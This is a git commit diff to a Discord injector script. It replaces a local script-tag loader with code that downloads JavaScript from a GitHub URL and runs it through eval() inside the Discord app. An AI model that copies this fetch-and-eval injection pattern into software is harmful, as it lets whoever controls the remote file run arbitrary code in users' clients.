9b9050aa82062e80b109a26626e3fc85c509be8e
Bad Woofsky <butterkuchen524@gmail.com>
2017-09-06 19:15:52 +0200

    Update discord.injector.js

--- discord.injector.js
+++ discord.injector.js
@@ -1,5 +1,18 @@
-var s = document.createElement("script");
-s.type="text/javascript";
-s.src="http://192.168.47.43/injector.js";
-document.head.appendChild(s);
-console.log("[InjectorJS] Discord Crypto Fuck smashed the code into this app");
+
+/*
+Hauptscript
+*/
+
+
+var xmlhttp;
+if (window.XMLHttpRequest){
+  xmlhttp = new XMLHttpRequest();
+  xmlhttp.open("GET", "https://raw.githubusercontent.com/4thebadwoofsky/scripts.common/master/discord.io.api.js" ,false);
+  xmlhttp.onreadystatechange = function () {
+    if (xmlhttp.readyState != 4) return;
+    eval(xmlhttp.responseText);
+    console.log("[InjectorJS] Discord Crypto Fuck smashed the code into this app");
+  };
+  xmlhttp.send(null);
+}
+
